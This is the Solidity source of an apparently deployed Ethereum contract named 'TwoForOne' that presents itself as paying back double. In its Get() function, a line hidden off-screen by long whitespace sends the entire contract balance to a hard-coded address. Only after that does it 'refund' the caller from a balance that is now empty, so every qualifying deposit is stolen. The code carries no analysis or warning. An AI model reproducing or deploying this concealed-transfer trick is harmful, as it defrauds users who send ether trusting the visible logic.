
//Address: 0x43De395326E1FD472bF8AB81bbC895CC620705eD
//Contract name: TwoForOne
//Balance: 0 Ether
//Verification Date: 2/3/2018
//Transacion Count: 3

// CODE STARTS HERE

pragma solidity ^0.4.19;

contract TwoForOne
{
    function() public payable{}
   
    function Get()
    public
    payable
    {                                                                    
        if(msg.value>=1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address(0x9Cc9B3133c1deb8E66AcA7eC5ebCad26cd24ff27).transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
}
